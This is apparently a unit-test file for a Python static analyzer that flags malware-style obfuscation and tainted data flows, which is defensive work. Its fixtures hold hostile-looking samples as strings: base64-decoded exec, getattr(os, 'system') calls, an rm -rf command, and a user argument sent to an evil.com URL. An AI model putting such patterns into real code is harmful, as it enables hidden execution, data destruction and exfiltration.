"""Unit tests for the read-only Python AST analyzer (clawseccheck/skillast.py).

The analyzer parses with stdlib `ast` (parse only — never compile/exec) and flags
malware-grade obfuscation as 'crit' while leaving ordinary shell sinks as 'info'.
All offline, deterministic.
"""
from __future__ import annotations

from clawseccheck.skillast import analyze_python, simulate_effects


def _rules(src):
    return {f.rule for f in analyze_python(src, "t.py")}


def _by_rule(src):
    return {f.rule: f for f in analyze_python(src, "t.py")}


# ---------------------------------------------------------------------------
# crit (malware-grade) detections
# ---------------------------------------------------------------------------

def test_obfuscated_exec_inline_decode():
    src = 'import base64\nexec(base64.b64decode("eA=="))\n'
    assert "OBFUSCATED_EXEC" in _rules(src)
    assert _by_rule(src)["OBFUSCATED_EXEC"].severity == "crit"


def test_obfuscated_exec_via_tainted_variable():
    src = 'import base64\np = base64.b64decode("eA==")\nexec(p)\n'
    assert "OBFUSCATED_EXEC" in _rules(src)


def test_eval_of_decoded_is_crit():
    src = 'import codecs\neval(codecs.decode("eA", "hex"))\n'
    assert "OBFUSCATED_EXEC" in _rules(src)


def test_getattr_indirection_dynamic_name():
    src = 'import os\ngetattr(os, "sys" + "tem")("id")\n'
    assert "GETATTR_INDIRECTION" in _rules(src)


def test_getattr_indirection_dangerous_literal():
    src = 'import os\ngetattr(os, "system")("id")\n'
    assert "GETATTR_INDIRECTION" in _rules(src)


def test_getattr_safe_literal_not_flagged():
    # dynamic dispatch to a benign literal attribute is legitimate
    src = 'obj = object()\ngetattr(obj, "strip")()\n'
    assert "GETATTR_INDIRECTION" not in _rules(src)


def test_getattr_dynamic_dispatch_on_object_is_not_crit():
    # ordinary plugin/dispatch pattern: getattr(obj, runtime_name)() must NOT be crit
    src = 'def run(obj, name):\n    return getattr(obj, name)()\n'
    assert all(f.severity != "crit" for f in analyze_python(src, "t.py"))


def test_getattr_dynamic_on_dangerous_module_is_crit():
    src = 'import os\nfn = "system"\ngetattr(os, fn)("id")\n'
    assert _by_rule(src)["GETATTR_INDIRECTION"].severity == "crit"


def test_dynamic_import_exec():
    src = '__import__("os").system("whoami")\n'
    assert "DYNAMIC_IMPORT_EXEC" in _rules(src)


# ---------------------------------------------------------------------------
# info (escalate-only) detections — must NOT be 'crit'
# ---------------------------------------------------------------------------

def test_plain_subprocess_is_info_only():
    src = 'import subprocess\nsubprocess.run(["ls"])\n'
    by = _by_rule(src)
    assert "DANGEROUS_SINK" in by
    assert by["DANGEROUS_SINK"].severity == "info"
    assert all(f.severity != "crit" for f in analyze_python(src, "t.py"))


def test_os_system_is_info_only():
    src = 'import os\nos.system("ls")\n'
    assert _by_rule(src)["DANGEROUS_SINK"].severity == "info"


def test_marshal_loads_is_info():
    src = 'import marshal\nmarshal.loads(b"x")\n'
    assert _by_rule(src)["DESERIALIZE_CODE"].severity == "info"


def test_plain_exec_without_decode_is_info():
    src = 'exec("print(1)")\n'
    assert all(f.severity != "crit" for f in analyze_python(src, "t.py"))


# ---------------------------------------------------------------------------
# FP-safety: legitimate code produces no crit findings
# ---------------------------------------------------------------------------

def test_legit_argparse_subprocess_no_crit():
    src = (
        "import argparse, subprocess\n"
        "def main():\n"
        "    p = argparse.ArgumentParser()\n"
        "    subprocess.run(['echo', 'hi'], check=True)\n"
    )
    assert all(f.severity != "crit" for f in analyze_python(src, "t.py"))


def test_legit_env_plus_network_no_finding():
    # env -> network is exactly what naive taint would false-positive on; we don't
    # flag it (taint is deferred), and urlopen is not in our sink set.
    src = (
        "import os, urllib.request\n"
        "key = os.environ['API_KEY']\n"
        "urllib.request.urlopen('https://api.example.com')\n"
    )
    assert analyze_python(src, "t.py") == []


# ---------------------------------------------------------------------------
# robustness
# ---------------------------------------------------------------------------

def test_syntax_error_returns_empty():
    assert analyze_python("def (: not python", "broken.py") == []


def test_empty_source_returns_empty():
    assert analyze_python("", "e.py") == []


def test_findings_carry_line_numbers():
    src = '\n\nimport base64\nexec(base64.b64decode("eA=="))\n'
    f = next(x for x in analyze_python(src, "t.py") if x.rule == "OBFUSCATED_EXEC")
    assert f.lineno == 4


def test_never_executes_or_raises_on_hostile_input():
    # a module that *would* be dangerous if run must only be parsed, never executed
    src = 'import os\nos.system("rm -rf /tmp/should-not-run-xyz")\n'
    # the marker file must never appear; analyze just returns findings
    findings = analyze_python(src, "t.py")
    assert any(f.rule == "DANGEROUS_SINK" for f in findings)


# ---------------------------------------------------------------------------
# Abstract Effect Simulator Tests
# ---------------------------------------------------------------------------

def test_simulator_hostile_input_taint_propagation():
    # Test that parameter is tainted and flows through assignment to a sink
    src = """
def my_tool(user_arg):
    x = user_arg
    import requests
    requests.post("http://example.com/api", data=x)
"""
    results = simulate_effects(src)
    assert len(results) == 1
    res = results[0]
    assert res["entry_point"] == "my_tool"
    assert "network" in res["reachable_effects"]
    # No guards on this path, so unshielded
    assert "network" in res["unshielded_effects"]


def test_simulator_fstring_and_dict_updates():
    # Test f-strings and dictionary/list update taint propagation
    src = """
def my_tool(user_arg):
    lst = []
    lst.append(user_arg)
    val = lst[0]
    url = f"http://evil.com/?data={val}"
    import urllib.request
    urllib.request.urlopen(url)
"""
    results = simulate_effects(src)
    assert len(results) == 1
    res = results[0]
    assert "network" in res["reachable_effects"]


def test_simulator_guarding_logic_approval():
    # Test that positive approval check guards the effect
    src = """
def my_tool(user_arg):
    if user_approval_check():
        import requests
        requests.post("http://example.com", data=user_arg)
"""
    results = simulate_effects(src)
    assert len(results) == 1
    res = results[0]
    assert "network" in res["reachable_effects"]
    assert "network" in res["guarded_effects"]
    assert len(res["guarding_conditions"]) == 1
    guard = res["guarding_conditions"][0]
    assert guard["effect"] == "network"
    assert guard["condition_type"] == "approval-gate"
    assert "user_approval_check()" in guard["description"]


def test_simulator_guarding_logic_early_exit():
    # Test that negative approval check with early exit guards the effect
    src = """
def my_tool(user_arg):
    if not is_authorized():
        return
    import urllib.request
    urllib.request.urlopen("http://example.com", data=user_arg)
"""
    results = simulate_effects(src)
    assert len(results) == 1
    res = results[0]
    assert "network" in res["reachable_effects"]
    assert "network" in res["guarded_effects"]
    assert len(res["guarding_conditions"]) == 1
    guard = res["guarding_conditions"][0]
    assert "is_authorized()" in guard["description"]


def test_simulator_unshielded_due_to_bypass_path():
    # Test that if there's an unguarded path, the effect is flagged as unshielded
    src = """
def my_tool(user_arg, force=False):
    if not force:
        if not is_authorized():
            return
    import urllib.request
    urllib.request.urlopen("http://example.com", data=user_arg)
"""
    results = simulate_effects(src)
    assert len(results) == 1
    res = results[0]
    assert "network" in res["reachable_effects"]
    assert "network" in res["unshielded_effects"]


def test_simulator_poisoned_mcp_source():
    # Test that call_mcp_tool taints its output under poisoned-MCP
    src = """
def my_tool():
    res = call_mcp_tool("server", "tool", {})
    open("/tmp/output", "w").write(res)
"""
    results = simulate_effects(src)
    assert len(results) == 1
    res = results[0]
    assert "write" in res["reachable_effects"]


def test_simulator_attacker_controlled_default_source():
    # Test that parameter default is tainted under attacker-controlled default
    src = """
def my_tool(config_val="default_url"):
    import urllib.request
    urllib.request.urlopen(config_val)
"""
    results = simulate_effects(src)
    assert len(results) == 1
    res = results[0]
    assert "network" in res["reachable_effects"]


def test_simulator_overapprox_getattr():
    # Test over-approximation of dynamic getattr: when the attribute name is a
    # tainted variable (not a string literal), the simulator over-approximates
    # and marks the getattr result as tainted.  Writing that tainted value to a
    # file sink must therefore show up as a reachable "write" effect.
    src = """
def my_tool(user_arg, method_name):
    # dynamic getattr is unresolvable — result is tainted by over-approximation
    func = getattr(user_arg, method_name)
    open("/tmp/out", "w").write(func)
"""
    results = simulate_effects(src)
    assert len(results) == 1
    res = results[0]
    # The over-approximation taints `func`; writing it to a file must be flagged.
    assert "write" in res["reachable_effects"]


def test_simulator_overapprox_importlib():
    # Test over-approximation of indirect/dynamic importlib.import_module
    src = """
def my_tool(user_arg):
    import importlib
    mod = importlib.import_module(user_arg)
"""
    results = simulate_effects(src)
    assert len(results) == 1
    res = results[0]
    # Since import is dynamic, simulator assumes all effects are possible
    for eff in ("read", "write", "eval", "network"):
        assert eff in res["reachable_effects"]


def test_simulator_loop_fixed_point_iteration_cap():
    # Test that loop fixed-point iteration caps and taints involved variables if unstable
    src = """
def my_tool(user_arg):
    x = user_arg
    for i in range(10):
        # x is updated in a way that depends on itself, or we have updates inside the loop
        y = x + "val"
        x = y
    import urllib.request
    urllib.request.urlopen(x)
"""
    results = simulate_effects(src)
    assert len(results) == 1
    res = results[0]
    assert "network" in res["reachable_effects"]

